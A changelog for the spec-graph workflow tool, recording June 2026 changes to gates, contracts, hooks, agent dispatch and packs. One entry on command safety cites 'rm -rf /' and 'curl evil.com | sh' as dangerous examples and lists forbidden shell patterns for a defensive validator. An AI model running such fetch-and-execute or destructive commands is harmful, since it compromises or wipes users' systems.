# spec-graph Changelog

All archived changes are recorded here.

## 2026-06-26 — change-1782438668128 [completed]

**Title**: Bootstrap change lifecycle
**Type**: feature
**Priority**: medium

Add apply/sync/archive subcommands to spec-graph change command

**Profile patches applied**:
- `criticality` → `compliance`

**Sync impact**:

**Snapshot**: `.spec-graph/snapshots/change-1782438668128-2026-06-26T01-52-35-271Z`
## 2026-06-26 — change-1782441630192 [completed]

**Title**: Profile override layer + reviewed_at freeze
**Type**: feature
**Priority**: medium

Add --build and --profile-override CLI flags that land in profile.overrides; Compose merges with priority user-override > repo-hard-evidence > LLM. Add profile freeze via reviewed_at with a review command; warn/block composing from unreviewed profile.

**Snapshot**: `.spec-graph/snapshots/change-1782441630192-2026-06-26T03-02-34-280Z`
## 2026-06-26 — change-1782443137192 [completed]

**Title**: Contract drift as a hard gate
**Type**: feature
**Priority**: medium

Add require_contracts_current to Gate type; enforce engine reads contract registry and blocks transitions when any consumer is stale/broken. Add builtin check contract-drift-gate that surfaces drift as a failing check. Wire exit-merged gate to require contracts current.

**Snapshot**: `.spec-graph/snapshots/change-1782443137192-2026-06-26T03-20-18-229Z`
## 2026-06-26 — change-1782445013608 [completed]

**Title**: Lifecycle e2e
**Type**: feature
**Priority**: medium

verify complete+discard subcommands

**Snapshot**: `.spec-graph/snapshots/change-1782445013608-2026-06-26T03-37-10-333Z`
## 2026-06-26 — change-1782444552147 [completed]

**Title**: Close change lifecycle: complete + discard transitions
**Type**: feature
**Priority**: medium

Add  and  subcommands: in_progress→completed (require acceptance passed via gate check) and in_progress→discarded. appendAudit. Update archive message to point at complete instead of machine transition. Add tests.

**Snapshot**: `.spec-graph/snapshots/change-1782444552147-2026-06-26T03-37-23-779Z`
## 2026-06-26 — change-1782445457636 [completed]

**Title**: Fix $exists semantics for 'unknown' dimension values
**Type**: bugfix
**Priority**: medium

compose's evaluateAppliesWhen treats $exists as key-present; fix so $exists also requires value != 'unknown'. Otherwise data-design pack activates spuriously on every project where persistence defaulted to unknown, dragging data-model-frozen gate into the workflow.

**Snapshot**: `.spec-graph/snapshots/change-1782445457636-2026-06-26T03-50-24-352Z`
## 2026-06-26 — change-1782445907483 [completed]

**Title**: Contract ripple: reverify subcommand
**Type**: feature
**Priority**: medium

Add contract reverify <contract_id> --consumer <id>: bumps bound_version to current, records reverified_at. Closes ripple loop.

**Snapshot**: `.spec-graph/snapshots/change-1782445907483-2026-06-26T07-38-33-275Z`
## 2026-06-26 — change-1782459723760 [completed]

**Title**: Worktree isolation + scope-lock + merge-queue (wdf inheritance)
**Type**: feature
**Priority**: medium

Port the three wdf execution primitives to spec-graph as domain-neutral engines: work-unit isolation via git worktrees, scope-lock validation against declared track boundaries, merge-queue serialization with overlap detection.

**Snapshot**: `.spec-graph/snapshots/change-1782459723760-2026-06-26T08-17-44-787Z`
## 2026-06-26 — change-1782462015839 [completed]

**Title**: Integrate isolation into change lifecycle (auto-worktree + scope-lock check + merge-queue enqueue)
**Type**: feature
**Priority**: medium

Wire worktree/scope-lock/merge-queue into the FSM: auto-create worktree on change apply, scope-lock-validate as a built-in check, auto-enqueue on change complete

**Snapshot**: `.spec-graph/snapshots/change-1782462015839-2026-06-26T08-54-37-749Z`
## 2026-06-26 — change-1782464376508 [completed]

**Title**: Add clone-detection + reuse-scan checks (governance §6.3 reuse gate)
**Type**: feature
**Priority**: medium

Implement the reuse gate from schemas.md §6.3: clone-detection (kind:clone, layer:unit, threshold-based, blocks) + reuse-scan (kind:reuse, layer:integration, finds orphan symbols + trace satisfies edges, warns). Maps to existing Check/Gate primitives, no new primitive needed.

**Snapshot**: `.spec-graph/snapshots/change-1782464376508-2026-06-26T09-11-30-921Z`
## 2026-06-26 — change-1782465228275 [completed]

**Title**: Add LLM Sense classifier (CLAUDE.md §Sense: LLM只参与第一段)
**Type**: feature
**Priority**: high

Abstract SenseClassifier interface with two impls: RepoScanClassifier (deterministic, default) and LlmClassifier (injectable, fails-closed to repo scan). runSense accepts description + classifier options. Fix hardcoded llm_classified=true lie. Enforce repo-hard-evidence priority over LLM.

**Snapshot**: `.spec-graph/snapshots/change-1782465228275-2026-06-26T09-45-07-550Z`
## 2026-06-26 — change-1782467331883 [completed]

**Title**: Enforce 4-layer acceptance model: auto-wire required layer checks into exit gate
**Type**: feature
**Priority**: high

Currently exit-merged gate hardcodes unit/integration checks but skips required deployment/system checks from acceptance_layers. Add a Compose-time step that collects all required=true acceptance layer checks and injects them into exit-merged.require_checks. Add a built-in check acceptance-layer-audit that reports which layers are required but have no checks declared.

**Snapshot**: `.spec-graph/snapshots/change-1782467331883-2026-06-26T13-44-51-789Z`
## 2026-06-26 — change-1782481569463 [completed]

**Title**: Compose-time shared contract suggestion (§6.3 layer 3: cross-track duplicate → shared contract)
**Type**: feature
**Priority**: medium

When ≥2 tracks consume a contract that no track produces, emit a human-reviewable suggestion to introduce a contract/shared-lib (single producer, multi-consumer). Does not auto-wire — per §6.3, premature abstraction is worse than duplication. Also add a built-in check shared-contract-audit that reports orphan-consumed contracts.

**Snapshot**: `.spec-graph/snapshots/change-1782481569463-2026-06-26T14-33-29-244Z`
## 2026-06-26 — change-1782484741327 [completed]

**Title**: Unify gate evaluation: machine transition must enforce require_contracts_current
**Type**: bugfix
**Priority**: high

Two divergent gate evaluation paths exist. enforce/runEnforce checks gate.require_contracts_current (contract drift), but machine/StateMachineEngine.evaluateGate does NOT. This means machine transition lets transitions through even when consumers are bound to stale contract versions — silently breaking the contract federation guarantee that CLAUDE.md lists as spec-graph's exclusive differentiator. Fix: add require_contracts_current check + missing_contracts field to StateMachineEngine.evaluateGate, mirroring enforce logic. Add tests verifying machine transition blocks on stale consumers.

**Snapshot**: `.spec-graph/snapshots/change-1782484741327-2026-06-26T14-58-26-909Z`
## 2026-06-26 — change-1782486307800 [completed]

**Title**: Constitutional command safety: whitelist + forbidden patterns (inherit wdf SPEC §5)
**Type**: feature
**Priority**: high

spec-graph's check.command field executes arbitrary shell with zero validation. A third-party pack could ship 'rm -rf /' or 'curl evil.com | sh' as a check command and the engine would run it. wdf-method SPEC §5 already specifies the fix: a command whitelist (npm test, npm run, npx, node, jest, vitest, tsc, eslint + builtin sentinels) and forbidden patterns (&&, ||, ;, |, $(), backticks, >, <, curl, wget, sudo, su, eval, rm -rf). Add these to constitution.yaml as security.command_whitelist + security.forbidden_patterns, add a command-safety-validate builtin check that scans graph.checks for violations, register in foundation.pack exit-merged gate. This is the security-critical slice of the broader 'constitution as enforceable rules' gap (wdf's 5 不可违背原则 + spec-kit's 9 Articles are the next candidate, deferred to keep this change focused).

**Snapshot**: `.spec-graph/snapshots/change-1782486307800-2026-06-26T15-22-30-240Z`
## 2026-06-27 — change-1782487597434 [completed]

**Title**: Constitutional articles: qualitative invariants (inherit spec-kit 9 Articles)
**Type**: feature
**Priority**: medium

Add articles to constitution — named qualitative rules (required_section, min_length, co_completed) validated by a generic articles-validate builtin check. Extends constitution beyond numeric thresholds to per-artifact content quality.

**Snapshot**: `.spec-graph/snapshots/change-1782487597434-2026-06-27T01-27-09-807Z`
## 2026-06-27 — change-1782524039043 [completed]

**Title**: DDD domain development workflow: ddd.pack + kernel extensions
**Type**: feature
**Priority**: high

Add complete DDD (Domain-Driven Design) development flow to spec-graph. Includes: ddd.pack with strategic design artifacts (context-map, ubiquitous-language), tactical design artifacts (aggregates, domain-events), DDD-specific checks (bounded-context-boundary, aggregate-invariant), and gate patches. May require kernel extensions for context map relationship types and domain event versioning.

**Snapshot**: `.spec-graph/snapshots/change-1782524039043-2026-06-27T01-58-55-491Z`
## 2026-06-27 — change-1782530439158 [completed]

**Title**: PostToolUse hook: dispatch manifest auto-injection
**Type**: feature
**Priority**: medium

Add PostToolUse hook (hooks/dispatch-watcher.mjs) that intercepts 'spec-graph dispatch --json' Bash invocations, parses the manifest, and injects it as additionalContext (system-reminder) so the main Claude Code agent can automatically dispatch sub-agents via the Agent tool per coordinator-protocol.md. Includes: hook script, hooks.json config registration, 11 tests covering all edge cases (non-Bash, non-dispatch, done manifest, missing actions, meeting injection, chained commands), CLAUDE.md auto-execution protocol section.

**Snapshot**: `.spec-graph/snapshots/change-1782530439158-2026-06-27T03-20-58-502Z`
## 2026-06-27 — change-1782539372085 [completed]

**Title**: Close dispatch loop gaps: input_artifacts + status-report protocol + prompt envelope
**Type**: feature
**Priority**: medium

Close 3 of 5 identified gaps in the dispatch→hook→sub-agent→next_step loop. (1) dispatch manifest now includes input_artifacts field with resolved paths, so coordinator doesn't need to query machine-state. (2) Sub-agents end responses with a structured status-report block (DONE/DONE_WITH_CONCERNS/NEEDS_CONTEXT/BLOCKED) that coordinator parses with regex+JSON.parse — no LLM keyword guessing. (3) action.prompt is now a standardized envelope (Identity/System Prompt placeholder/Task Context/Input Artifacts placeholders/Meeting/Constraints/Completion) per agents/prompt-envelope.md. Added: status-report-protocol.md, prompt-envelope.md, status-report-parser.test.ts. Updated all 5 agent prompts (pm/architect/developer/reviewer/qa) with status-report templates. Updated coordinator-protocol.md. 17 new tests, 388/388 total passing.

**Snapshot**: `.spec-graph/snapshots/change-1782539372085-2026-06-27T05-49-42-194Z`
## 2026-06-27 — change-1782541494133 [completed]

**Title**: Meeting runtime persistence + continuation + ad-hoc meetings
**Type**: feature
**Priority**: medium

Close 2 remaining dispatch loop gaps: meeting state not persisted (breakpoint 4) and meeting state not in manifest (breakpoint 5). (1) MeetingRuntime type with status/current_round/current_round_contributions fields, persisted to .spec-graph/meetings/<id>.yaml. (2) Full meeting command family: list/show/init/record/advance/complete/abandon. (3) Dispatch detects in-progress meetings and outputs continuation (broadcasts prior contributions) instead of fresh start. (4) Ad-hoc meetings: coordinator can self-initiate meetings for ANY unclear/deep-discussion issue — no pack declaration required. initAdHocMeeting creates synthetic MeetingDecl with default diverge/challenge/converge rounds, stored in runtime file's ad_hoc_decl field. resolveMeetingDecl falls back to ad_hoc_decl when meeting not in graph. (5) Updated CLAUDE.md with Ad-hoc Meeting protocol, coordinator-protocol.md with ad-hoc section. 7 new meeting engine tests + 3 new dispatch continuation tests + 7 ad-hoc tests = 17 new tests. 413/413 total passing.

**Snapshot**: `.spec-graph/snapshots/change-1782541494133-2026-06-27T06-25-07-682Z`
## 2026-06-27 — change-1782543028459 [completed]

**Title**: Sub-agent dispatch optimization: requires_sub_agent + hook trim + fallback input_artifacts
**Type**: feature
**Priority**: medium

Distinguish deterministic actions (run_check/verify_trace/transition) from sub-agent actions (produce_artifact/perform_stage/resolve_violation) via requires_sub_agent field. Trim PostToolUse hook injection to avoid duplicating manifest already in main agent context. Add fallback inferInputArtifacts() for actions whose agents lack explicit input_artifact_kinds.

**Snapshot**: `.spec-graph/snapshots/change-1782543028459-2026-06-27T06-50-37-933Z`
## 2026-06-27 — change-1782544310779 [completed]

**Title**: Manifest gate failure details + check_command embedding + audit trail
**Type**: feature
**Priority**: medium

Expose missing_artifacts/failed_checks/missing_traces/forbidden_violations at manifest top level so coordinator knows WHAT failed (not just that gate_passed===false). Embed actual CheckDecl.command as action.check_command for run_check actions so coordinator can run shell directly without consulting graph.yaml. Append dispatch entries to active change audit_log for traceability. Document NEEDS_CONTEXT retry cap (3) in coordinator protocol.

**Snapshot**: `.spec-graph/snapshots/change-1782544310779-2026-06-27T07-14-16-075Z`
## 2026-06-27 — change-1782547118047 [completed]

**Title**: Run command action handlers + verify_trace trace_query exposure
**Type**: bugfix
**Priority**: medium

Fix: run.ts executeAction only handled run_check and transition; in full-auto mode, produce_artifact/verify_trace/resolve_violation fell through to transition parser and crashed with 'Cannot parse transition action id'. Add explicit handlers: verify_trace re-evaluates trace query (completed if satisfied, blocked with hint if missing); produce_artifact/perform_stage/resolve_violation yield blocked with 'requires dispatch' message. Add blocked-status loop break to prevent infinite loops. Add trace_query field to manifest for verify_trace actions so coordinator knows WHAT trace needs creating. Update hook to handle verify_trace specially. Change process.exit(1) to process.exitCode=1 for testability.

**Snapshot**: `.spec-graph/snapshots/change-1782547118047-2026-06-27T07-58-51-903Z`
## 2026-06-27 — change-1782552548387 [completed]

**Title**: spec-graph trace add command + status.ts failure arrays + status.ts verify_trace classification
**Type**: feature
**Priority**: medium

Implement spec-graph trace add subcommand (referenced by verify_trace hints in dispatch.ts/run.ts but previously nonexistent). Add: writes trace entry to .spec-graph/traces/<name>.yaml, matches gate trace query by from_kind/to_kind/via, dedupes entries, supports --json. Backward-compatible: legacy 'spec-graph trace <node-id>' view still works (add is detected as subcommand). Fix status.ts: (1) JSON output now includes missing_artifacts/failed_checks/missing_traces/forbidden_violations arrays + done flag (parity with dispatch manifest); (2) human-readable 'Next Action' correctly classifies verify_trace as Auto (deterministic), not Manual. Add forbidden_violations to human-readable gate failures.

**Snapshot**: `.spec-graph/snapshots/change-1782552548387-2026-06-27T09-29-16-532Z`
## 2026-06-27 — change-1782553450705 [completed]

**Title**: Surface missing_contracts + forbidden_violations in NextPlan (contract drift detection)
**Type**: bugfix
**Priority**: medium

computeNextPlan didn't check require_contracts_current or load forbidden_invariants — gates with these flags appeared passed in dispatch/status/next but failed at machine transition (silent inconsistency). Make computeNextPlan async, add missing_contracts to NextPlan, populate by loading contract registry + collectDriftedConsumers when any gate requires contracts_current. Also load forbidden_invariants when gates declare forbid clauses. Surface missing_contracts in dispatch manifest, status JSON, next renderer, and hook reminder. Add resolve_violation action for contract drift. Export loadContractRegistry/loadForbiddenInvariants/collectDriftedConsumers from enforce/index.ts (previously private, duplicated in machine/index.ts).

**Snapshot**: `.spec-graph/snapshots/change-1782553450705-2026-06-27T09-44-18-993Z`
## 2026-06-27 — change-1782553821715 [completed]

**Title**: Deduplicate machine/index.ts helpers + make all next_step values executable
**Type**: refactor
**Priority**: medium

Remove duplicate loadContractRegistry/loadForbiddenInvariants/collectDriftedConsumers from machine/index.ts — they were copy-pasted from enforce/index.ts, now imported from there as canonical source. Both gate evaluation paths (machine transition + plan computation) now share one implementation, eliminating drift risk. Also: convert verify_trace/perform_stage/resolve_violation next_step from comment blocks to executable 'spec-graph dispatch --json' commands — coordinator can now run them via Bash without manual interpretation.

**Snapshot**: `.spec-graph/snapshots/change-1782553821715-2026-06-27T09-50-29-280Z`
## 2026-06-27 — change-1782554927671 [completed]

**Title**: Project-level config injection (.spec-graph/config.yaml)
**Type**: feature
**Priority**: medium

Add .spec-graph/config.yaml with context (injected into pack context during compose) and rules (per-artifact validation guidance). Mirrors OpenSpec's openspec/config.yaml. Lets multiple projects reuse the same pack while injecting project-specific tech stack constraints (e.g. 'We use React 18 + TS') and adding per-artifact rules without forking the pack. Compose engine reads config.yaml and merges context into pack.context_ref content; rules are surfaced to artifact producers via dispatch manifest.

**Snapshot**: `.spec-graph/snapshots/change-1782554927671-2026-06-27T10-16-22-336Z`
## 2026-06-27 — change-1782555843253 [completed]

**Title**: Constitution versioning + diff
**Type**: feature
**Priority**: medium

Add constitution bump and diff commands. Track constitution versions with semantic versioning. Store snapshots in .spec-graph/.constitution-snapshot.json. Add constitution_diff to change.sync_impact to show which rules changed and what needs re-verification. Enables teams to see constitution evolution and identify artifacts that need re-validation after rule changes.

**Snapshot**: `.spec-graph/snapshots/change-1782555843253-2026-06-27T13-32-46-700Z`
## 2026-06-27 — change-1782567232001 [completed]

**Title**: Checklist command
**Type**: feature
**Priority**: medium

Add spec-graph checklist <story-id> command that generates .spec-graph/checklists/<story-id>.md with 5 mechanical checks (REQ mapping, scope atomicity, AC count, REQ resolution, path safety) and 5 soft checks (no ambiguous adjectives, each AC verifiable, edge cases considered, dependencies declared, out-of-scope explicit). Gate can require checklist completion. Prevents underspecified stories from entering implementation phase.

**Snapshot**: `.spec-graph/snapshots/change-1782567232001-2026-06-27T13-40-09-044Z`
## 2026-06-27 — change-1782567690687 [completed]

**Title**: Rich artifact documents with templates
**Type**: feature
**Priority**: medium

Add content layer to spec-graph: each artifact can have an associated markdown document (.spec-graph/artifacts/<id>.md) with rich content. Add 'spec-graph artifact init <id> --template <template>' command to generate skeleton documents from templates. Add templates for PRD, architecture, story, epic, task, ADR. Add explicit linking via frontmatter (story references requirement IDs, task links to story). Persist AI-generated analysis and planning to these documents. This bridges the gap between state tracking (current spec-graph) and content management (BMAD/OpenSpec).

**Snapshot**: `.spec-graph/snapshots/change-1782567690687-2026-06-27T13-56-35-031Z`
## 2026-06-28 — change-1782636875044 [completed]

**Title**: Tier 2: Enriched run lifecycle (8 states)
**Type**: feature
**Priority**: medium

Extend IsolationStatus and MergeQueueStatus with StoryRail's granular states: prepared/self_verified/submitted/accepted/rejected (in addition to active/merged/abandoned). Enables multi-party handoff tracking (implementer → submitter → reviewer → merger). Update run command and status display to surface new states.

**Snapshot**: `.spec-graph/snapshots/change-1782636875044-2026-06-28T09-03-25-245Z`
## 2026-06-28 — change-1782637423251 [completed]

**Title**: Tier 2: Diff-based selective test execution (touchfiles)
**Type**: feature
**Priority**: medium

Add touchfiles field to CheckDecl so checks declare which files they depend on. Run command reads git diff and only executes checks whose touchfiles match changed files. Also add tier field (gate|periodic) for scheduling expensive checks periodically instead of every commit. Reduces CI cost on large projects.

**Snapshot**: `.spec-graph/snapshots/change-1782637423251-2026-06-28T10-10-40-283Z`
## 2026-06-28 — change-1782641459585 [completed]

**Title**: Tier 2: Multi-unit story execution
**Type**: feature
**Priority**: medium

Add execution_units field to ChangeDescriptor allowing stories to be split into multiple independent execution units. Each unit has its own scope, checks, and artifacts. Derive story status from unit statuses. Enables parallel execution of large stories.

**Snapshot**: `.spec-graph/snapshots/change-1782641459585-2026-06-28T10-19-21-720Z`
## 2026-06-28 — change-1782641995558 [completed]

**Title**: Tier 2: Hook/extension system (pre/post command hooks)
**Type**: feature
**Priority**: medium

Add .spec-graph/hooks.yaml config allowing users to register shell commands that run before/after spec-graph commands. Hook types: pre-dispatch, post-dispatch, pre-transition, post-transition, pre-check, post-check. Each hook has command (shell command), when (pre/post), and optional condition (glob matching command args). Enables custom CI integration, notifications, artifact sync without modifying spec-graph core.

**Snapshot**: `.spec-graph/snapshots/change-1782641995558-2026-06-28T13-18-49-052Z`
## 2026-06-28 — change-1782652848986 [completed]

**Title**: Tier 3: End-to-end integration tests
**Type**: feature
**Priority**: medium

Add comprehensive end-to-end tests covering the full workflow from init to integrate. Tests should verify: (1) init creates correct structure, (2) sense analyzes project correctly, (3) compose generates correct graph, (4) dispatch returns correct manifest, (5) run executes deterministic actions, (6) state transitions work, (7) checks run correctly, (8) gate evaluation works, (9) full workflow completes end-to-end. Use real project structure, not mocks.

**Snapshot**: `.spec-graph/snapshots/change-1782652848986-2026-06-28T13-45-20-970Z`
## 2026-06-28 — change-1782654648722 [completed]

**Title**: Tier 3: Scope prefix overlap detection
**Type**: feature
**Priority**: medium

Add directory prefix overlap detection to scope-lock engine. When two parallel worktrees have overlapping allowed paths (e.g., src/a and src/a/utils), detect the prefix overlap and warn/block. Prevents messy merge conflicts from parallel agents modifying nested paths. Small fix, high value for multi-agent workflows.

**Snapshot**: `.spec-graph/snapshots/change-1782654648722-2026-06-28T14-02-52-332Z`
## 2026-06-28 — change-1782655409368 [completed]

**Title**: Wire scope overlap detection to spec-graph scope check + hooks.yaml example
**Type**: feature
**Priority**: medium

Wire detectScopeOverlaps into the spec-graph scope check command so overlaps are reported when checking scope. Create example hooks.yaml template. Add spec-graph scope overlap subcommand to list all scope overlaps across active isolation units.

**Snapshot**: `.spec-graph/snapshots/change-1782655409368-2026-06-28T14-05-08-041Z`
## 2026-06-28 — change-1782655859285 [completed]

**Title**: Make checklist mechanical checks parse document content
**Type**: feature
**Priority**: medium

Replace stub implementations of checkAtomicScope, checkACCount, and checkPathSafety with real document parsing. checkAtomicScope reads the story doc and checks if it has reasonable scope (under ~200 lines). checkACCount parses AC sections and counts them. checkPathSafety validates file paths mentioned in the doc are within project scope. This makes the checklist command actually useful for quality validation.

**Snapshot**: `.spec-graph/snapshots/change-1782655859285-2026-06-28T14-19-01-716Z`
## 2026-06-28 — change-1782656593889 [completed]

**Title**: Wire hooks to transition and run commands
**Type**: feature
**Priority**: medium

Add pre/post hook execution to machine transition and run commands (dispatch already has hooks). This completes the hook coverage for the main workflow-driving commands.

**Snapshot**: `.spec-graph/snapshots/change-1782656593889-2026-06-28T14-24-18-507Z`
## 2026-06-28 — change-1782656738836 [completed]

**Title**: Auto-detect ambiguous adjectives in checklist documents
**Type**: feature
**Priority**: medium

Enhance checklist soft check #1 to automatically scan document content for ambiguous adjectives (fast, user-friendly, robust, scalable, flexible, intuitive, powerful, simple, easy, seamless). Each match is reported with line context. Transforms a soft (manual) check into a mechanical (auto-detected) check.

**Snapshot**: `.spec-graph/snapshots/change-1782656738836-2026-06-28T14-31-00-300Z`
## 2026-06-28 — change-1782657492797 [completed]

**Title**: Enhanced codebase scanning for Sense phase (brownfield support)
**Type**: feature
**Priority**: medium

Enhance the Sense engine to deeply analyze existing codebases: detect project structure (src/lib/docs/tests dirs), identify frameworks (React, Express, Next.js, Vue, etc.) from package.json dependencies, find test frameworks and coverage configs, detect TypeScript/JavaScript mix, identify existing CI/CD configs. This enables spec-graph to provide meaningful guidance when taking over legacy projects, not just greenfield ones.

**Snapshot**: `.spec-graph/snapshots/change-1782657492797-2026-06-28T14-41-37-334Z`
## 2026-06-28 — change-1782657774504 [completed]

**Title**: Incremental impact analysis (ripple effect tracking)
**Type**: feature
**Priority**: medium

Implement impact analysis: when an artifact changes, automatically identify downstream artifacts and checks affected. Uses trace edges + check dependencies to compute ripple. Helps coordinator prioritize work and understand blast radius of changes. Critical for legacy project takeovers where understanding dependencies is crucial.

**Snapshot**: `.spec-graph/snapshots/change-1782657774504-2026-06-28T14-59-40-801Z`
## 2026-06-28 — change-1782555403969 [completed]

**Title**: Per-artifact status states (ready/blocked)
**Type**: feature
**Priority**: medium

Extend ArtifactState.status enum to include ready/blocked states (in addition to pending/in_progress/completed/failed). Add 'artifact ready <id>' and 'artifact block <id>' subcommands for multi-agent handoff. Update dispatch manifest to expose new states, update status command to display them with distinct colors. Enables coordinator to mark artifacts as 'ready for review' (architect can pick up) or 'blocked' (prevents accidental dispatch). Backward compatible: existing status values unchanged, new values opt-in.

**Snapshot**: `.spec-graph/snapshots/change-1782555403969-2026-06-28T15-11-14-961Z`
## 2026-06-28 — change-1782660230199 [completed]

**Title**: Migration planning engine for legacy projects
**Type**: feature
**Priority**: medium

Implement migration planning engine: analyzeCodebase scans existing code (TypeScript, linting, tests, components, dependencies), generateMigrationPlan produces incremental steps sorted by priority. New command: spec-graph migrate. Tested on spec-graph itself: 97 components detected, 4 migration steps generated.

**Snapshot**: `.spec-graph/snapshots/change-1782660230199-2026-06-28T15-24-19-309Z`
## 2026-06-28 — change-1782660408826 [completed]

**Title**: Automatic check retry with backoff
**Type**: feature
**Priority**: medium

Add automatic retry to run command: when a check fails, retry up to --retries times with exponential/linear/fixed backoff. Track retry count per check. After max retries, escalate to user. Prevents transient failures from blocking workflow.

**Snapshot**: `.spec-graph/snapshots/change-1782660408826-2026-06-28T15-41-21-380Z`
## 2026-06-28 — change-1782662359923 [completed]

**Title**: Refactoring safety net (baseline snapshot + regression detection)
**Type**: feature
**Priority**: medium

Implement safety-net engine: captureSnapshot records exports, function signatures, file hashes, and test results. compareSnapshot detects removed exports, changed files, and test regressions. New command: spec-graph safety-net [--compare]. Tested on spec-graph: 56 files, 211 exports, 546 tests captured.

**Snapshot**: `.spec-graph/snapshots/change-1782662359923-2026-06-28T16-00-06-800Z`
## 2026-06-28 — change-1782662863637 [completed]

**Title**: Workflow visualization (Graphviz DOT + JSON summary)
**Type**: feature
**Priority**: medium

Generate DOT files for workflow visualization: artifacts as nodes grouped by kind, trace edges as dashed arrows, pipeline stages as colored nodes, gates as bold edges. New command: spec-graph visualize [--format dot|json] [--output file]. Also generates JSON summary of graph stats.

**Snapshot**: `.spec-graph/snapshots/change-1782662863637-2026-06-28T16-08-09-394Z`
## 2026-06-28 — change-1782663076294 [completed]

**Title**: Inject codebase summary into dispatch manifest
**Type**: feature
**Priority**: medium

Add codebase_summary field to dispatch manifest so AI agents see framework versions, test setup, project structure when dispatching work. Critical for legacy project takeovers.

**Snapshot**: `.spec-graph/snapshots/change-1782663076294-2026-06-28T16-23-03-313Z`
## 2026-06-28 — change-1782663904267 [completed]

**Title**: Inject active change context into dispatch manifest
**Type**: feature
**Priority**: medium

Add active_change field to dispatch manifest with title, description, type, and recent audit log. Helps AI agents understand the broader context of what they're working on.

**Snapshot**: `.spec-graph/snapshots/change-1782663904267-2026-06-28T16-30-30-290Z`
## 2026-06-28 — change-1782664354246 [completed]

**Title**: Enhance doctor with feature-usage diagnostics
**Type**: feature
**Priority**: medium

Add 'features' category to doctor that checks which enhanced capabilities are configured: hooks.yaml, diff-select (touchfiles on checks), safety-net snapshot, migration plan, scope locks, constitution, project config. Reports which features are active vs available but unused.

**Snapshot**: `.spec-graph/snapshots/change-1782664354246-2026-06-28T16-37-28-499Z`
## 2026-06-28 — change-1782664813432 [completed]

**Title**: Pack optimization: templates, agents, touchfiles, context
**Type**: refactor
**Priority**: medium

Comprehensive pack optimization: (1) Add missing templates to 8 packs that lack them, (2) Add agent bindings to domain packs, (3) Add touchfiles to checks for diff-select, (4) Add context.md to key packs. This makes all 17 packs production-ready.

**Snapshot**: `.spec-graph/snapshots/change-1782664813432-2026-06-28T16-50-18-882Z`
## 2026-06-28 — change-1782665846316 [completed]

**Title**: Complete pack templates: backend + feature
**Type**: feature
**Priority**: medium

Add missing templates to backend.pack (backend-impl.md) and feature.pack (feature-plan.md). All 17 packs now have at least 1 template.

**Snapshot**: `.spec-graph/snapshots/change-1782665846316-2026-06-28T16-57-43-220Z`
## 2026-06-29 — change-1782693071640 [completed]

**Title**: Hooks on ALL commands + Cross-artifact analyze + Constitution injection
**Type**: feature
**Priority**: medium

Three HIGH priority optimizations: (1) Add executeHooks() to all 28 remaining commands, (2) New spec-graph analyze command for cross-artifact consistency/duplication/coverage analysis, (3) Inject constitution principles into compose/checklist/dispatch outputs.

**Snapshot**: `.spec-graph/snapshots/change-1782693071640-2026-06-29T00-46-02-276Z`
## 2026-06-29 — change-1782694063449 [completed]

**Title**: Per-artifact validation rules in config.yaml + Pack customization layer
**Type**: feature
**Priority**: medium

Two MEDIUM priority items: (1) Add per-artifact validation rules to .spec-graph/config.yaml so users define custom validation per artifact type, (2) Add pack override mechanism so users can customize pack fields without forking.

**Snapshot**: `.spec-graph/snapshots/change-1782694063449-2026-06-29T01-01-44-954Z`
## 2026-06-29 — change-1782695803892 [discarded]

**Title**: Test plan generation
**Type**: feature
**Priority**: medium

Testing

**Snapshot**: `.spec-graph/snapshots/change-1782695803892-2026-06-29T01-18-19-965Z`
## 2026-06-29 — change-1782695993848 [discarded]

**Title**: Test
**Type**: feature
**Priority**: medium

test

**Snapshot**: `.spec-graph/snapshots/change-1782695993848-2026-06-29T01-20-37-106Z`
## 2026-06-29 — change-1782696214653 [discarded]

**Title**: Test plan_path
**Type**: feature
**Priority**: medium

test

**Snapshot**: `.spec-graph/snapshots/change-1782696214653-2026-06-29T01-24-53-527Z`
## 2026-06-29 — change-1782696432661 [discarded]

**Title**: Test minimal plan
**Type**: feature
**Priority**: medium

test

**Snapshot**: `.spec-graph/snapshots/change-1782696432661-2026-06-29T01-27-34-844Z`
## 2026-06-29 — change-1782696800074 [discarded]

**Title**: Plan path integration
**Type**: feature
**Priority**: medium

Verify plan_path in JSON

**Snapshot**: `.spec-graph/snapshots/change-1782696800074-2026-06-29T01-38-59-569Z`
## 2026-06-29 — change-1782697637943 [discarded]

**Title**: No plan test
**Type**: feature
**Priority**: medium

test

**Snapshot**: `.spec-graph/snapshots/change-1782697637943-2026-06-29T01-48-01-819Z`
## 2026-06-29 — change-1782697638134 [discarded]

**Title**: With plan
**Type**: feature
**Priority**: medium

test

**Snapshot**: `.spec-graph/snapshots/change-1782697638134-2026-06-29T01-48-02-201Z`
## 2026-06-29 — change-1782697873274 [discarded]

**Title**: 添加 spec-graph 性能基准测试
**Type**: performance
**Priority**: medium

dispatch/compose 性能基准测试，覆盖 10/50/100/500 artifacts

**Snapshot**: `.spec-graph/snapshots/change-1782697873274-2026-06-29T01-52-09-930Z`
## 2026-06-29 — change-1782698320943 [completed]

**Title**: Test archive MD
**Type**: feature
**Priority**: medium

test

**Snapshot**: `.spec-graph/snapshots/change-1782698320943-2026-06-29T01-58-41-693Z`
## 2026-06-29 — A2-B3-Atomic-merge-Retro-Stale-1782703675628 [completed]

**Title**: A2-B3: Atomic merge + Retro + Stale marking + Rollback + Phase restart
**Type**: feature
**Priority**: medium

Implement 5 features from round 3 comparison: (A2) Atomic merge guard with git merge --no-commit --no-ff; (A3) Retrospective command for lessons learned; (B1) Impact --mark-stale to flag affected artifacts; (B2) Safe rollback command using snapshots; (B3) Phase restart via machine restart-stage

**Snapshot**: `.spec-graph/snapshots/A2-B3-Atomic-merge-Retro-Stale-1782703675628-2026-06-29T03-28-05-618Z`
